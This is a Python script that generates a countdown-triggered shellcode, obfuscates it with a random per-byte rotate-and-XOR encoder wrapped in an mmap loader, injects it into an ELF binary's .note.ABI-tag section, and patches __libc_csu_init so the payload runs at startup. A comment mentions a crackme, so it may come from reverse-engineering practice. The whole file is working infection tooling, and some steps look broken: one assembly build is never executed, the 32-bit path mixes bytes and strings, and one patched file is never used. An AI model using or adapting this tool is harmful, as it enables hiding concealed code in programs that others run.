
# ============= prepare ============================================
# [1. find original entry point (using lief)]
# 2. timer countdown (using time) --> time + countdown
# 3. compile time_shell: nasm -f bin -o time_shell.bin time_shell.s

# ============= elfinject =========================================
# 4. 

# ./elfinject crackme time_shell.bin ".array_init" 0x5000 -1
# [python3 patcher.py crackme d00180 -> change entry point]

# ============== usage ===============
# python3 inject_timer.py [file_ELF] [arch] [countdown]

import lief 
import time 
import sys
import os
import random

def mask(n):

   if n >= 0:
       return 2**n - 1
   else:
       return 0
def rol(n, rotations, width=8):

    rotations %= width
    if rotations < 1:
        return n
    n &= mask(width)
    return ((n << rotations) & mask(width)) | (n >> (width - rotations))
def ror(n, rotations, width=8):
    rotations %= width
    if rotations < 1:
        return n
    n &= mask(width)
    return (n >> rotations) | ((n << (width - rotations)) & mask(width))
def encode_shell(filename):
    _shellcode = open(filename, "rb").read()
    _encoded = ""
    _encoded2 = ""
    for x in bytearray(_shellcode):
        rand1 = random.randint(1,8)
        x = rol(x,rand1)                 # random (1-8) bit rotation to left
        x = x^rand1                      # XOR with first seed
        rand2 = random.randint(1,8)
        x = ror(x,rand2)                 # random (1-8) bit rotation to right
        x = x^rand2                      # XOR with second seed
        if x == 0 :                      # Test if there is nullbyte after encoding
            return ()
        _encoded += '\\x'
        _encoded += '%02x' % x
        _encoded += '\\x%02x' % rand1
        _encoded += '\\x%02x' % rand2
        _encoded2 += '0x'
        _encoded2 += '%02x,' % x
        _encoded2 += '0x%02x,' % rand1
        _encoded2 += '0x%02x,' % rand2

    return (_encoded, _encoded2[:-1])

def read_file_bin(name):
    data = open(name, "rb").read()
    out = ""
    for x in bytearray(data):
        out += '0x'
        out += '%02x,' % x
    return out[:-1]

def create_shell(cd, arch):

    # ============== process countdown ===================
    countdown = hex(int(time.time()) + 60 * (cd))
    # print (countdown)
    # ====================================================

    if arch == "64":
        # print ("64")
        # =============== compile time =============
        template = open("time_shell64_orig.s", "r").read()
        name64 = "time_shell64.s"
        template = template.replace("time_countdown", str(countdown), 1)
        open(name64, "w").write(template)
        execute = "nasm -f bin -o time_shell64.bin " + name64
        os.system(execute)

        # ================ obfuscate ================
        name_file = "time_shell64.bin"
        encoded = (encode_shell(name_file))
        sc_obfuscate = encoded[1]
        enc_time = open("enc_time64_orig.s", "r").read().replace("obfuscated_shellcode", sc_obfuscate, 1)
        name2 = "enc_time64.s"
        open(name2, "w").write(enc_time)
        execute = "nasm -f bin -o time_shell64_obf.bin " + name2
        os.system(execute)

        # ================= mmap =====================
        template = open("mmap_orig.s", "r").read()
        name3 = "mmap64.s"
        encode_ver2 = read_file_bin("time_shell64_obf.bin")
        template = template.replace("shellcode_obf_ver2", encode_ver2, 1)
        open(name3, "w").write(template)
        execute = "nasm -f bin -o final_shell64.bin " + name3

    if arch == "32":
        # print ("32")
        # =============== process file shell 32bit =============
        template = open("time_shell32_orig.s", "rb").read()
        name32 = "time_shell32.s"
        template = template.replace("time_countdown", str(countdown), 1)
        open(name32, "wb").write(template)
        execute = "nasm -f bin -o time_shell32.bin " + name32
        os.system(execute)
        
        # ================ obfuscate ================
        name_file = "time_shell32.bin"
        encoded = (encode_shell(name_file))
        sc_obfuscate = encoded[1]
        enc_time = open("enc_time32_orig.s", "r").read().replace("obfuscated_shellcode", sc_obfuscate, 1)
        name2 = "enc_time32.s"
        open(name2, "w").write(enc_time)
        execute = "nasm -f bin -o time_shell32_obf.bin " + name2
        os.system(execute)

        # ================= mmap =====================
        template = open("mmap_orig.s", "r").read()
        name3 = "mmap32.s"
        encode_ver2 = read_file_bin("time_shell32_obf.bin")
        template = template.replace("shellcode_obf_ver2", encode_ver2, 1)
        open(name3, "w").write(template)
        execute = "nasm -f bin -o final_shell32.bin " + name3

    print ("====== Create Shell done ========")
    return 0

def patched_file(name):
    
    # ================= parse file elf ======================
    fileOut = name + "_ver2"
    cm = lief.parse(name)
    va = cm.get_section(".text").virtual_address
    lib_init = cm.get_symbol("__libc_csu_init").value

    # ================= create array patch ===================
    addr_inject = cm.get_section(".note.ABI-tag").virtual_address
    arr = [0xe8, 0, 0, 0, 0, 90, 90, 90, 90, 90, 90, 90, 90]
    tmp = addr_inject - (lib_init + 0x49) - 5

    for i in range(1, 5, 1):
        if tmp > 0:
            arr[i] = tmp & 0xff
        else:
            break
        tmp = tmp >> 8

    # ================= patch opcode =========================
        
    addr_patch = lib_init - va + 0x49
    txt = cm.get_section(".text").content
    for i in range(addr_patch, addr_patch+13):
        txt[i] = arr[i - addr_patch]
    cm.get_section(".text").content = txt 
    # ================ out file ============================
    cm.write(fileOut)


def elfinject_shell(filename, arch, base_section):
    # ================ create new file add ".patched" ============
    f1 = open(filename,"rb")
    orig = f1.read()
    f1.close()
    fileOut = filename + ".patched"
    f2 = open(fileOut, "wb")
    f2.write(orig)
    f2.close()
    # ========================= injector ==========================
    filename = fileOut 
    if arch == "64":
        execute = "./elfinject " + filename + " final_shell64.bin \".note.ABI-tag\" " + hex(base_section) + " -1"
        patched_file(filename)

        # print (execute)
    if arch == "32":
        execute = "./elfinject " + filename + " final_shell32.bin \".note.ABI-tag\" " + hex(base_section) + " -1"
        patched_file(filename)
        
    os.system(execute)
    print ("========= Inject done ===========")

    return 0

def clean(arch):
    # ========= clean file asm + bin ============
    if arch == "64":
        os.system("rm -rf time_shell64.s")
        os.system("rm -rf time_shell64.bin")
    if arch == "32":
        os.system("rm -rf time_shell32.s")
        os.system("rm -rf time_shell32.bin")
    print ("======= Clean done ============")

    return 0



if (len(sys.argv) != 5):
    print ("Usage: python3 inject_timer.py [file_ELF] [arch] [countdown(minutes)] [add_base]\n")
else:
    countdown = int(sys.argv[3])
    arch = str(sys.argv[2])
    base_section = int(sys.argv[4], 16)
    filename = sys.argv[1]

    print ("Starting...\n")
    create_shell(countdown, arch)
    elfinject_shell(filename, arch, base_section)
    # clean(arch)
    print ("============= Done! =============")
    print ("File out: " + filename + ".patched")


